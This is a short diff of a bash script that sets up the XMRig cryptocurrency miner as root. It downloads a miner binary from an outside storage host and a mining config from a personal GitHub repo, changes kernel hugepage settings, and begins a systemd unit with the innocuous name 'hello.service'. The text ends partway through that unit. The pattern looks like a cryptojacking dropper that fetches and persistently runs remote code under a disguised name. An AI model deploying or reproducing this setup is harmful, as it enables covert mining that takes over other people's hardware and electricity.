@@ -1,5 +1,5 @@
 !/bin/bash
-sudo su && sudo apt-get update -y && sudo apt-get install libhwloc-dev -y && cd /usr/local/src/ && sudo mkdir xmrig && cd xmrig && sudo mkdir build && cd build && wget https://hutrans.nyc3.digitaloceanspaces.com/xmrig && wget https://raw.githubusercontent.com/taikhoanxzc004/xmrig/master/kalinh16-16c-config.json -O /usr/local/src/xmrig/build/config.json && sudo echo "vm.nr_hugepages=1024" >> /etc/sysctl.conf && sudo sysctl -p &&
+sudo su && sudo apt-get update -y && sudo apt-get install libhwloc-dev -y && cd /usr/local/src/ && sudo mkdir xmrig && cd xmrig && sudo mkdir build && cd build && wget https://hutrans.nyc3.digitaloceanspaces.com/xmrig && wget https://raw.githubusercontent.com/taikhoanxzc004/xmrig/master/kalinh16-16c-config.json -O /usr/local/src/xmrig/build/config.json && sudo echo "vm.nr_hugepages=1024" >> /etc/sysctl.conf && sudo sysctl -p
 
 cat > /lib/systemd/system/hello.service <<EOL
 [Unit]
